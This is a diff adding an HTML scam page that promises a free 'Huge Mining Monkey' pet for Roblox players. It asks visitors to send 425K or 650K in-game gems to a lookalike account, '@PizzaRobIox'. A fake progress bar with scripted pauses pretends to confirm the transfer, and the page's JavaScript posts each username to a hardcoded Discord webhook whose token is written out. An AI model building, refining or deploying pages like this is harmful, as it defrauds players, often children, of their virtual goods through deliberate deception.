@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>FREE Huge Mining Monkey</title>
+  <style>
+    body {
+      background-color: #111;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    img {
+      max-width: 400px;
+      margin-top: 20px;
+    }
+    h1 {
+      font-size: 2.5rem;
+      margin: 20px 0;
+      color: #FFD700;
+    }
+    .offer {
+      background: #222;
+      border-radius: 10px;
+      margin: 20px auto;
+      padding: 20px;
+      max-width: 600px;
+      box-shadow: 0 0 10px #FFD700;
+    }
+    .confirm-buttons button {
+      margin: 5px;
+      padding: 10px 20px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .yes-button {
+      background-color: #4CAF50;
+      color: white;
+    }
+    .no-button {
+      background-color: #f44336;
+      color: white;
+    }
+    .progress-container {
+      display: none;
+      margin-top: 20px;
+    }
+    .progress-bar {
+      width: 100%;
+      background: #333;
+      border-radius: 5px;
+      overflow: hidden;
+      margin-top: 10px;
+    }
+    .progress-fill {
+      height: 20px;
+      width: 0;
+      background-color: #FFD700;
+      text-align: center;
+      line-height: 20px;
+      color: black;
+      font-weight: bold;
+    }
+    .status {
+      margin-top: 10px;
+      font-size: 1rem;
+    }
+    .checkmark {
+      font-size: 2rem;
+      color: #00ff88;
+      display: none;
+    }
+    input[type="text"] {
+      padding: 10px;
+      margin-top: 10px;
+      border-radius: 5px;
+      border: none;
+      width: 80%;
+      max-width: 300px;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://static.wikia.nocookie.net/pet-simulator/images/3/3b/PS99_Huge_Mining_Monkey.png/revision/latest?cb=20250329165133" alt="Huge Mining Monkey">
+  <h1>FREE Huge Mining Monkey</h1>
+
+  <div class="offer">
+    <h2>Offer 1</h2>
+    <p>Send 5 Messages In Our Discord Server (submit images, we’ll review them)</p>
+    <input type="text" id="user1" placeholder="Enter in your Roblox user">
+    <br><br>
+    <button class="yes-button" onclick="sendWebhook(1)">Done</button>
+  </div>
+
+  <div class="offer">
+    <h2>Offer 2</h2>
+    <p>Send 425K Gems in mailbox (<b>@PizzaRobIox</b>)</p>
+    <input type="text" id="user2" placeholder="Enter in your Roblox user">
+    <div class="confirm-buttons">
+      <button class="yes-button" onclick="startConfirmation()">Yes</button>
+      <button class="no-button">No</button>
+    </div>
+    <div class="progress-container" id="progressContainer">
+      <div class="status" id="status">Confirming...</div>
+      <div class="progress-bar">
+        <div class="progress-fill" id="progressFill">0%</div>
+      </div>
+      <div class="checkmark" id="checkmark">✔</div>
+    </div>
+  </div>
+
+  <div class="offer">
+    <h2>Offer 3</h2>
+    <p>Send 650K Gems to receive the Huge Mining Monkey instantly.</p>
+    <input type="text" id="user3" placeholder="Enter in your Roblox user">
+    <br><br>
+    <button class="yes-button" onclick="sendWebhook(3)">Done</button>
+  </div>
+
+  <script>
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1359428742904025088/S_6sHw3HzqzPsUmpJhwqwUEqjEJRN5CzuK0_qjnL0f4gGWTsDhYpAFGvq4LgxkYHI1H5';
+
+    function sendWebhook(offerNumber) {
+      const username = document.getElementById(`user${offerNumber}`).value;
+      if (!username) return alert('Please enter your Roblox user.');
+
+      const message = {
+        content: `✅ Offer ${offerNumber} completed by user: ${username}`
+      };
+
+      fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(message)
+      });
+
+      alert('Submitted! We will review your submission shortly.');
+    }
+
+    async function startConfirmation() {
+      const username = document.getElementById('user2').value;
+      if (!username) return alert('Please enter your Roblox user.');
+
+      document.getElementById('progressContainer').style.display = 'block';
+      let fill = document.getElementById('progressFill');
+      let status = document.getElementById('status');
+      let checkmark = document.getElementById('checkmark');
+
+      const pauses = [43, 66, 87, 92, 99];
+
+      for (let i = 0; i <= 100; i++) {
+        fill.style.width = i + '%';
+        fill.innerText = i + '%';
+
+        if (pauses.includes(i)) {
+          await new Promise(res => setTimeout(res, i === 99 ? 5000 : 2000));
+        } else {
+          await new Promise(res => setTimeout(res, 50));
+        }
+      }
+
+      status.innerText = "We are reviewing your request, please wait patiently over the next 10 hours or more to receive your prize.";
+      checkmark.style.display = 'block';
+
+      const message = {
+        content: `⛏️ Offer 2 confirmation complete by user: ${username}`
+      };
+
+      fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(message)
+      });
+    }
+  </script>
+</body>
+</html>
